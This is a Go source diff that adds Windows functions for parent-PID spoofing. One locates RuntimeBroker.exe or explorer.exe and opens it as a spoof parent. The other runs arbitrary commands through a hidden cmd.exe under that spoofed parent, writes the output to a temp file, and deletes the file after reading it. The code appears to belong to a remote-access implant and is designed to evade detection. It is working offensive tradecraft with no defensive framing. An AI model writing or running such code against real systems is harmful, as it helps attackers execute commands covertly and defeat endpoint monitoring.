@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -226,4 +227,86 @@ func enableTokenPrivilege(token windows.Handle, name string) error {
 		return fmt.Errorf("privilege not held by token")
 	}
 	return nil
+}
+
+// findSpoofParent returns a handle to RuntimeBroker.exe or explorer.exe opened
+// with PROCESS_CREATE_PROCESS so it can be used as a PPID spoof target.
+func findSpoofParent() (windows.Handle, error) {
+	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		return 0, err
+	}
+	defer windows.CloseHandle(snap)
+
+	var pe windows.ProcessEntry32
+	pe.Size = uint32(unsafe.Sizeof(pe))
+	if err := windows.Process32First(snap, &pe); err != nil {
+		return 0, err
+	}
+
+	const PROCESS_CREATE_PROCESS = 0x0080
+	var runtimeBroker, explorer windows.Handle
+	for {
+		name := windows.UTF16ToString(pe.ExeFile[:])
+		if strings.EqualFold(name, "RuntimeBroker.exe") {
+			h, err := windows.OpenProcess(PROCESS_CREATE_PROCESS, false, pe.ProcessID)
+			if err == nil {
+				runtimeBroker = h
+				break
+			}
+		} else if strings.EqualFold(name, "explorer.exe") && explorer == 0 {
+			h, err := windows.OpenProcess(PROCESS_CREATE_PROCESS, false, pe.ProcessID)
+			if err == nil {
+				explorer = h
+			}
+		}
+		if err := windows.Process32Next(snap, &pe); err != nil {
+			break
+		}
+	}
+
+	if runtimeBroker != 0 {
+		if explorer != 0 {
+			windows.CloseHandle(explorer)
+		}
+		return runtimeBroker, nil
+	}
+	if explorer != 0 {
+		return explorer, nil
+	}
+	return 0, fmt.Errorf("no suitable PPID spoof parent found")
+}
+
+// runShellOpsec runs cmd via cmd.exe spoofing the parent PID to RuntimeBroker.exe
+// or explorer.exe so the cmd.exe process appears as a child of a legitimate process.
+func runShellOpsec(cmd string) string {
+	hParent, err := findSpoofParent()
+	if err != nil || hParent == 0 {
+		return shellDirect(cmd)
+	}
+	defer windows.CloseHandle(hParent)
+
+	uid := fmt.Sprintf("%08x%016x", os.Getpid(), time.Now().UnixNano())
+	outPath := `C:\Windows\Temp\sbo` + uid + `.tmp`
+
+	c := exec.Command("cmd.exe")
+	c.SysProcAttr = &windows.SysProcAttr{
+		CmdLine:       `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`,
+		HideWindow:    true,
+		ParentProcess: syscall.Handle(hParent),
+	}
+	if err := c.Start(); err != nil {
+		return shellDirect(cmd)
+	}
+	done := make(chan error, 1)
+	go func() { done <- c.Wait() }()
+	select {
+	case <-done:
+	case <-time.After(60 * time.Second):
+		c.Process.Kill()
+		<-done
+	}
+	data, _ := os.ReadFile(outPath)
+	_ = os.Remove(outPath)
+	return string(data)
 }
